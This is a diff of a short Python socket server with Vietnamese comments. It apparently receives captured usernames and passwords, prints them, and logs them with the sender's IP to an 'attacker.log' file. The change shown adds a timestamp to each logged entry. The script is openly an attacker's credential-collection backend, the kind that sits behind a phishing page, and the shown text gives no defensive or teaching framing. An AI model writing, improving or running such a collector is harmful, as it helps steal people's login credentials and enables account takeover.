@@ -1,5 +1,6 @@
 import socket
 from datetime import datetime
+
 #1. socket
 server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 #2. lang nghe tai ip va port
@@ -20,9 +21,13 @@ while True:
     #print log
     print(f"USERNAME: {username}")
     print(f"PASSWORD: {password}")
+        #them thoi gian vao log
+    time=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open("attacker.log","a") as f:
         f.write(f"IP: {address}\n")
         f.write(f"USERNAME: {username}\n")
         f.write(f"PASSWORD: {password}\n")
+        f.write(f"TIME: {time}\n")
         f.write("--------------------------------------\n")
     client_socket.close()
+
